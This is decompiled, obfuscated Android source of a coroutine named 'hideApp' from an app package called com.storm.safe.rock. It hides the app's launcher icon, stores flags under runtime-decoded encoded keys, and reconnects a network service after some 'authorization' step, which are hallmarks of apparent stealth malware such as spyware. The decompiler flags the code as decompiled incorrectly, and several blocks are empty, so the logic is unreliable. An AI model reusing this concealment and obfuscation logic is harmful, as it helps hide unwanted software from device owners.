package com.storm.safe.rock.service;

import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import p000.AbstractC1262tj;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.bm0;
import p000.kg1;
import p000.l10;
import p000.sc0;
import p000.t60;
import p000.tz0;
import p000.yj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$hideApp$1", m214403f = "dqtvuisjd.kt", m214404l = {9334, 9389}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$hideApp$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52567a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52568a2;

    /* renamed from: a3 */
    public final /* synthetic */ boolean f52569a3;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$hideApp$1$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$hideApp$1$1 */
    final class C02931 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ yj1 f52570a1;

        /* renamed from: a2 */
        public final /* synthetic */ dqtvuisjd f52571a2;

        /* renamed from: a3 */
        public final /* synthetic */ boolean f52572a3;

        /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
        @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$hideApp$1$1$1", m214403f = "dqtvuisjd.kt", m214404l = {9354}, m214405m = "invokeSuspend")
        /* renamed from: com.storm.safe.rock.service.dqtvuisjd$hideApp$1$1$1, reason: invalid class name */
        final class AnonymousClass1 extends SuspendLambda implements l10 {

            /* renamed from: a1 */
            public long[] f52573a1;

            /* renamed from: a2 */
            public int f52574a2;

            /* renamed from: a3 */
            public int f52575a3;

            /* renamed from: a4 */
            public int f52576a4;

            /* renamed from: a5 */
            public long f52577a5;

            /* renamed from: a6 */
            public int f52578a6;

            /* renamed from: a7 */
            public final /* synthetic */ dqtvuisjd f52579a7;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            public AnonymousClass1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
                super(2, interfaceC0876mv);
                this.f52579a7 = dqtvuisjdVar;
            }

            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                return new AnonymousClass1(this.f52579a7, interfaceC0876mv);
            }

            @Override // p000.l10
            public final Object invoke(Object obj, Object obj2) {
                return ((AnonymousClass1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
            }

            /* JADX WARN: Removed duplicated region for block: B:14:0x004b  */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0067 A[Catch: Exception -> 0x001d, TryCatch #0 {Exception -> 0x001d, blocks: (B:6:0x0019, B:19:0x0061, B:21:0x0067, B:23:0x006b, B:24:0x0085, B:26:0x008b, B:27:0x00b2, B:28:0x00b6), top: B:35:0x0019 }] */
            /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:18:0x0060 -> B:19:0x0061). Please report as a decompilation issue!!! */
            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public final Object invokeSuspend(Object obj) throws Throwable {
                long[] jArr;
                int i;
                int i2;
                CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                int i3 = this.f52578a6;
                if (i3 == 0) {
                    kg1.m213544f4(obj);
                    jArr = new long[]{2000, 4000, 8000, 15000, 30000};
                    i = 0;
                    i2 = 5;
                    if (i < i2) {
                    }
                    return C1351vv.f60710b1;
                }
                if (i3 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                long j = this.f52577a5;
                i = this.f52576a4;
                i2 = this.f52575a3;
                int i4 = this.f52574a2;
                jArr = this.f52573a1;
                try {
                    kg1.m213544f4(obj);
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "❌ [网络] 授权完成后重连失败 (第" + (i + 1) + "次)", e);
                }
                C0323a8 c0323a8 = this.f52579a7.f52415e6;
                if (c0323a8 != null) {
                    if (c0323a8.f53103a3) {
                        t60.m214714d6("dqtvuisjd", "✅ [网络] 授权完成后重连成功 (第" + (i + 1) + "次)");
                    } else {
                        C0323a8 c0323a82 = this.f52579a7.f52415e6;
                        if (c0323a82 == null) {
                            t60.m214724f2("networkManager");
                            throw null;
                        }
                        c0323a82.m211643a8();
                        t60.m214714d6("dqtvuisjd", "🔄 [网络] 授权完成后尝试重连 (第" + (i + 1) + "次, 延迟" + j + "ms)");
                        i = i4 + 1;
                        if (i < i2) {
                            j = jArr[i];
                            try {
                            } catch (Exception e2) {
                                i4 = i;
                                t60.m214705c6("dqtvuisjd", "❌ [网络] 授权完成后重连失败 (第" + (i + 1) + "次)", e2);
                            }
                            this.f52573a1 = jArr;
                            this.f52574a2 = i;
                            this.f52575a3 = i2;
                            this.f52576a4 = i;
                            this.f52577a5 = j;
                            this.f52578a6 = 1;
                            if (b81.m210571b1(j, this) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            i4 = i;
                            C0323a8 c0323a83 = this.f52579a7.f52415e6;
                            if (c0323a83 != null) {
                            }
                        }
                    }
                }
                return C1351vv.f60710b1;
            }
        }

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02931(yj1 yj1Var, dqtvuisjd dqtvuisjdVar, boolean z, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52570a1 = yj1Var;
            this.f52571a2 = dqtvuisjdVar;
            this.f52572a3 = z;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02931(this.f52570a1, this.f52571a2, this.f52572a3, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02931 c02931 = (C02931) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02931.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            yj1 yj1Var = this.f52570a1;
            String str = yj1Var.f61329a2;
            String str2 = yj1Var.f61328a1;
            boolean z = yj1Var.f61327a0;
            dqtvuisjd dqtvuisjdVar = this.f52571a2;
            if (z) {
                t60.m214714d6("dqtvuisjd", "✅ 隐藏成功: " + str2);
                dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), true).apply();
                dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new AnonymousClass1(dqtvuisjdVar, null), 2);
                if (this.f52572a3) {
                    new Handler(Looper.getMainLooper()).postDelayed(new bm0(dqtvuisjdVar, 8), 500L);
                }
                if (!dqtvuisjdVar.f52477k8) {
                    dqtvuisjdVar.m211460e9();
                }
                dqtvuisjdVar.m211513l0("隐藏成功: " + str2, true);
            } else {
                tz0.m214807a7("❌ 隐藏失败: ", str, "dqtvuisjd");
                dqtvuisjdVar.f52475k6 = false;
                dqtvuisjdVar.m211513l0("隐藏失败: " + str, false);
            }
            return C1351vv.f60710b1;
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$hideApp$1$2", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$hideApp$1$2 */
    final class C02942 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ dqtvuisjd f52580a1;

        /* renamed from: a2 */
        public final /* synthetic */ Exception f52581a2;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02942(dqtvuisjd dqtvuisjdVar, Exception exc, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52580a1 = dqtvuisjdVar;
            this.f52581a2 = exc;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02942(this.f52580a1, this.f52581a2, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02942 c02942 = (C02942) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02942.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            dqtvuisjd dqtvuisjdVar = this.f52580a1;
            dqtvuisjdVar.f52475k6 = false;
            dqtvuisjdVar.m211513l0("系统异常: " + this.f52581a2.getMessage(), false);
            return C1351vv.f60710b1;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$hideApp$1(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, boolean z) {
        super(2, interfaceC0876mv);
        this.f52568a2 = dqtvuisjdVar;
        this.f52569a3 = z;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$hideApp$1(interfaceC0876mv, this.f52568a2, this.f52569a3);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$hideApp$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:22:0x005f, code lost:
    
        if (kotlinx.coroutines.AbstractC0780a0.m213696a7(r1, r4, r8) != r0) goto L24;
     */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52567a1;
        dqtvuisjd dqtvuisjdVar = this.f52568a2;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 隐藏异常", e);
            C1180rh c1180rh = AbstractC1262tj.f60233a0;
            C0785a0 c0785a0 = sc0.f59953a0;
            C02942 c02942 = new C02942(dqtvuisjdVar, e, null);
            this.f52567a1 = 2;
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            C0328b3 c0328b3 = dqtvuisjdVar.f52434g5;
            if (c0328b3 == null) {
                t60.m214724f2("appIconHideManager");
                throw null;
            }
            int i2 = C0328b3.f53186a7;
            yj1 yj1VarM211758a2 = c0328b3.m211758a2(false);
            C1180rh c1180rh2 = AbstractC1262tj.f60233a0;
            C0785a0 c0785a02 = sc0.f59953a0;
            C02931 c02931 = new C02931(yj1VarM211758a2, dqtvuisjdVar, this.f52569a3, null);
            this.f52567a1 = 1;
            if (AbstractC0780a0.m213696a7(c0785a02, c02931, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i != 1 && i != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        return C1351vv.f60710b1;
    }
}
